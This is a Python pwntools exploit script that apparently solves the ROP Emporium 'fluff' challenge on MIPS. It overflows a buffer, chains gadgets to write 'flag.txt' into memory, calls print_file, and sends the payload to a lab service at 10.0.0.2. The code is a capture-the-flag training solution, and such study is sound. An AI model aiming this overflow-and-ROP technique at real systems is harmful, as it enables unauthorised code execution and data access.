from pwn import *
BINARY = "./fluff_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

gadget_get_s2 = p32(0x0040094C)
gadget_clear_s1 = p32(0x00400930)
gadget_write_s1 = p32(0x00400964)
gadget_echg_s1_s0 = p32(0x0040097C)
gadget_write_data = p32(0x0040099C)
gadget_call_print = p32(0x004009AC)

rop = b"A" * 0x24
rop += gadget_get_s2

rop += b"B" * 4
rop += p32(0x00411000)
rop += gadget_clear_s1

rop += b"B" * 4
rop += b"B" * 4
rop += gadget_write_s1

rop += b"B" * 4
rop += gadget_echg_s1_s0

rop += b"B" * 4
rop += gadget_get_s2

rop += b"B" * 4
rop += b"flag"
rop += gadget_clear_s1

rop += b"B" * 4
rop += b"B" * 4
rop += gadget_write_s1

rop += b"B" * 4
rop += gadget_write_data

rop += b"B" * 4
rop += gadget_get_s2

# 第一个写入
rop += b"B" * 4
rop += p32(0x00411004)
rop += gadget_clear_s1

rop += b"B" * 4
rop += b"B" * 4
rop += gadget_write_s1

rop += b"B" * 4
rop += gadget_echg_s1_s0

rop += b"B" * 4
rop += gadget_get_s2

rop += b"B" * 4
rop += b".txt"
rop += gadget_clear_s1

rop += b"B" * 4
rop += b"B" * 4
rop += gadget_write_s1

rop += b"B" * 4
rop += gadget_write_data

rop += b"B" * 4
rop += gadget_call_print

rop += b"B" * 4
rop += p32(ELF.symbols["print_file"])
rop += p32(0x00411000)

with open("raw", "wb") as f:
    f.write(rop)

p = remote("10.0.0.2", 9999)
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))